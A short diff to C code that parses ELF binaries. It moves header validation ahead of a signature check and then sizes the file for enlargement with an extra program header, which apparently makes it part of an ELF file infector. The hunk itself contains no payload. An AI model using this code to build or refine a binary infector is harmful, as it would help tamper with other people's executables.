@@ -848,15 +848,25 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 		*file_data = NULL;
 		goto error;
 	}
+	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
+		goto error;
+	elf->header = (ElfW(Ehdr) *) *file_data;
+	if (statbuf->st_size < elf->header->e_shoff
+							   + elf->header->e_shnum * elf->header->e_shentsize
+		|| statbuf->st_size
+			   < elf->header->e_phoff
+					 + elf->header->e_phnum * elf->header->e_phentsize
+		|| elf->header->e_ident[4] != ELFCLASS64)
+		goto error;
 	if (find_signature(*file_data, statbuf->st_size, ALPHA, OMEGA) >= 0)
 		goto error;
 
-	elf->header = (ElfW(Ehdr) *) *file_data;
 	*enlarging = VARAX;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
 	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
 	vm_release(*file_data, statbuf->st_size);
 	*file_data = MAP_FAILED;
+
 	if ((ret = io_resize(fd, statbuf->st_size + *enlarging)) < 0)
 	{
 		emit_hex(ret);
@@ -869,16 +879,7 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 		*file_data = NULL;
 		goto error;
 	}
-	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
-		goto error;
 	elf->header = (ElfW(Ehdr) *) *file_data;
-	if (statbuf->st_size < elf->header->e_shoff
-							   + elf->header->e_shnum * elf->header->e_shentsize
-		|| statbuf->st_size
-			   < elf->header->e_phoff
-					 + elf->header->e_phnum * elf->header->e_phentsize
-		|| elf->header->e_ident[4] != ELFCLASS64)
-		goto error;
 	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
 	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
 	fs_release(fd);
